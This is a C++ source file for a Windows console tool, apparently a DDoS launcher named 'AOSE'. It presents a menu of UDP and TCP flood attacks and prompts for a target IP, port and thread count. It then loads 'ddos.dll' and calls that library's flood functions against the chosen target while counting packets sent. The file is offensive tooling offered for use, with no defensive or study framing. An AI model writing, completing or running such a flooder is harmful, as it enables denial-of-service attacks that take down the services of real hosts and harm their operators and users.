// main.cpp - RANDOM NAME
#include <windows.h>
#include <iostream>
#include <string>
#include <thread>
#include <atomic>

typedef void (*FloodFunc)(const char*, unsigned short, unsigned int);

void setRed() { SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 12); }
void setWhite() { SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 7); }
void setYellow() { SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 14); }
void setGreen() { SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 10); }
void setCyan() { SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 11); }

std::atomic<bool> running(true);
std::atomic<long long> packets(0);
std::string currentTarget;
int currentPort;
int currentThreads;

void printLogo() {
    setCyan();
    std::cout << R"(
    ___    ____  _____ ______ 
   /   |  / __ \/ ___// ____/
  / /| | / / / /\__ \/ __/   
 / ___ |/ /_/ /___/ / /___   
/_/  |_/_____//____/_____/   
)" << std::endl;
    setWhite();
}

void stats() {
    while(running) {
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
        system("cls"); printLogo();
        setYellow();
        std::cout << "\n  Target : " << currentTarget << ":" << currentPort;
        std::cout << "\n  Threads: " << currentThreads << "\n";
        setGreen();  std::cout << "\n  Packets : " << packets.load();
        std::cout << "\n  [ENTER] = STOP\n";
        setWhite();
    }
}

int main() {
    SetConsoleTitleA("AOSE");
    
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    std::string dir = exePath;
    dir = dir.substr(0, dir.find_last_of("\\/"));
    std::string dllPath = dir + "\\ddos.dll";
    
    HINSTANCE rustDll = LoadLibraryA(dllPath.c_str());
    if(!rustDll) {
        setRed(); std::cout << "\n  ddos.dll not found!\n"; setWhite();
        system("pause"); return 1;
    }
    
    FloodFunc tcpFlood = (FloodFunc)GetProcAddress(rustDll, "tcp_flood");
    FloodFunc udpFlood = (FloodFunc)GetProcAddress(rustDll, "udp_flood");
    
    while(true) {
        running = false;
        system("cls"); printLogo();
        setYellow(); std::cout << "\n  [1] "; setWhite(); std::cout << "UDP Flood\n";
        setYellow(); std::cout << "  [2] "; setWhite(); std::cout << "TCP Flood\n";
        setYellow(); std::cout << "  [3] "; setWhite(); std::cout << "Exit\n";
        std::cout << "\n  > ";
        
        int c; std::cin >> c; std::cin.ignore();
        if(c==3) break;
        
        std::string ip; int port, threads;
        std::cout << "  Target: "; std::getline(std::cin, ip);
        std::cout << "  Port: "; std::cin >> port;
        std::cout << "  Threads: "; std::cin >> threads; std::cin.ignore();
        
        running = true; packets = 0;
        currentTarget = ip; currentPort = port; currentThreads = threads;
        std::thread s(stats); s.detach();
        
        if(c==1) udpFlood(ip.c_str(), port, threads);
        else if(c==2) tcpFlood(ip.c_str(), port, threads);
        
        std::cin.get();
        running = false;
        std::this_thread::sleep_for(std::chrono::milliseconds(500));
    }
    FreeLibrary(rustDll);
    return 0;
}
